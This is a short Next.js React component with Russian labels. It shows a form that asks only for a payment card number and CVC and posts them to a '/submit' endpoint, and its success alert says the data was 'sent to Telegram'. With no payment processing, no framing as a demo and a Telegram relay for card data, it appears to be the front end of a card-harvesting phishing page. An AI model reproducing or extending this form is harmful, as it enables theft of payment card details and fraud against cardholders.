"use client";
import { useState } from "react";

export default function Home() {
  const [cardNumber, setCardNumber] = useState("");
  const [cvc, setCVC] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await fetch("/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ cardNumber, cvc }),
      });

      if (response.status === 200) {
        alert("Данные успешно отправлены в Telegram!");
      } else {
        alert("Произошла ошибка при отправке данных.");
      }
    } catch (error) {
      console.error("Ошибка при отправке данных:", error);
    }

    setCardNumber("");
    setCVC("");
  };

  return (
    <form onSubmit={handleSubmit}>
      <div>
        <label htmlFor="cardNumber">Номер карты:</label>
        <input
          type="text"
          id="cardNumber"
          value={cardNumber}
          onChange={(e) => setCardNumber(e.target.value)}
          required
        />
      </div>
      <div>
        <label htmlFor="cvc">CVC код:</label>
        <input
          type="text"
          id="cvc"
          value={cvc}
          onChange={(e) => setCVC(e.target.value)}
          required
        />
      </div>
      <div>
        <button type="submit">Отправить</button>
      </div>
    </form>
  );
}
